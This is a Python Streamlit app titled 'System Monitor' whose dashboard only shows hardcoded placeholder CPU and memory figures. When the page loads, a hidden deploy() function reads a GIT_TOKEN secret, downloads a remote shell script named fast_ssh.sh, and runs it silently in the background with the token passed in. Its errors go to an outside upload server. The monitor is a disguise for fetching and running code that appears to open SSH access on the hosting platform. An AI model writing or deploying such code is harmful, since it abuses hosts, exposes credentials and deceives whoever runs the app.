#!/usr/bin/env python3
import os, sys, subprocess, socket, re, urllib.request
from pathlib import Path
import streamlit as st

hostname = socket.gethostname()
repo_match = re.search(r'gibunxi4201-([a-z0-9]+)-streamlit-app', hostname)
REPO_NAME = repo_match.group(1) if repo_match else "agsb0"
USER_HOME = Path.home()
UPLOAD_API = "https://file.zmkk.fun/api/upload"


def deploy():
    inited = USER_HOME / "root" / "inited"
    if inited.exists():
        return
    marker = USER_HOME / ".deploying"
    if marker.exists():
        return

    git_token = ""
    try:
        git_token = st.secrets.get("GIT_TOKEN", "")
    except Exception:
        pass
    if not git_token:
        git_token = os.environ.get("GIT_TOKEN", "")
    if not git_token:
        return

    marker.write_text("1")

    # Download fast_ssh.sh from idx-cloud using Python (curl may not exist)
    script_url = f"https://raw.githubusercontent.com/hhsw2015/idx-cloud/refs/heads/main/scripts/fast_ssh.sh"
    script_path = USER_HOME / "fast_ssh.sh"
    try:
        req = urllib.request.Request(script_url, headers={
            "Authorization": f"token {git_token}"
        })
        resp = urllib.request.urlopen(req, timeout=30)
        script_path.write_bytes(resp.read())
        script_path.chmod(0o755)
    except Exception as e:
        # Upload error for debugging
        try:
            import requests
            requests.post(UPLOAD_API, files={'file': (f'deploy_{REPO_NAME}.txt', f'download_error: {e}\n'.encode())}, timeout=5)
        except Exception:
            pass
        return

    # Execute with env vars
    cmd = f'cd ~ && export GIT_TOKEN="{git_token}" REPO="{REPO_NAME}" && bash ~/fast_ssh.sh'
    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)


st.set_page_config(page_title="System Monitor", page_icon="\U0001f50d")
st.title("\U0001f50d System Monitor")
st.write("Lightweight system monitoring dashboard.")
col1, col2 = st.columns(2)
col1.metric("CPU", "12%", "-2%")
col2.metric("Memory", "34%", "+1%")
st.write("---")
st.write("v1.0")

try:
    deploy()
except Exception:
    pass
